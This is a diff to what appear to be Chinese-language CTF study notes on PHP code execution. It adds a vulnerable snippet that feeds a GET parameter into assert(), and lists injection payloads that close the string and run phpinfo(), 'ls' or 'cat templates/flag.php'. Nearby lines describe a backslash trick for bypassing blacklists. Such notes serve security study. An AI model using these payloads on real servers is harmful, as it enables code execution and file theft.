@@ -94,3 +94,22 @@ echo eval("echo 1;");
 php内的"\"在做代码执行的时候，会识别特殊字符串，绕过黑名单。
 如\system
 
+
+^
+## **命令拼接**
+```
+if (isset($_GET['page'])) {
+	$page = $_GET['page'];
+} 
+
+$file = "templates/" . $page . ".php";
+
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+```
+闭合，拼接，注释
+```
+').phpinfo();//
+').system("cat templates/flag.php");//
+').system('cat templates/flag.php');//
+').system('ls');//
+```
